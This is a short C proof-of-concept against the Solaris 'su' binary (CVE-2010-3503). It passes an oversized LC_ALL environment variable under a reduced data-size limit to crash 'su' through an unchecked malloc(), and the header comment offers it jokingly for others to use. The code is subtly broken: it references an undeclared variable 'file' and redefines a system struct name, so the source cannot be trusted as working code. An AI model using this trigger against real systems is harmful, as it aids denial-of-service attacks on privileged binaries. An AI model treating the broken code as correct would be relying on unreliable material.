----[ PoC trigger 'su' as you.
/* Sun Solaris <= 10 'su' NULL pointer exploit
   ===========================================
   because these are so 2009 now. I would exploit
   this but my name is not spender or raptor. Sun
   do not check a call to malloc() when handling
   environment variables in 'su' code. They also
   don't check passwords when using telnet so who
   cares? You have to enter your local user pass
   to see this bug. Enjoy!

   admin@sundevil:~/suid$ ./x
   [ SunOS 5.11 'su' null ptr PoC
   Password:
   Segmentation Fault

  -- prdelka
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <sys/fcntl.h>
#include <sys/types.h>
#include <sys/mman.h>

struct {
        rlim_t    rlim_cur;     /* current (soft) limit */
        rlim_t    rlim_max;     /* hard limit */
} rlimit;

int main(int argc,char *argv[]){
        int fd;
        struct rlimit* rlp = malloc(sizeof(rlimit));
        getrlimit(RLIMIT_DATA,rlp);
        char* buf1 = malloc(300000);
        memset(buf1,'A',300000);
        long buf2 = (long)buf1 + 299999;
        memset((char*)buf2,0,1);
        memcpy(buf1,"LC_ALL=",7);
        rlp->rlim_cur = 16400;
        setrlimit(RLIMIT_DATA,rlp);
        char* env[] = {buf1,file,NULL};
        char* args[] = {"su","-",getlogin(),NULL};
        printf("[ SunOS 5.11 'su' null ptr PoC\n");
        execve("/usr/bin/su",args,env);
}


// This was disclosed and patched in October 2010, CVE-2010-3503 
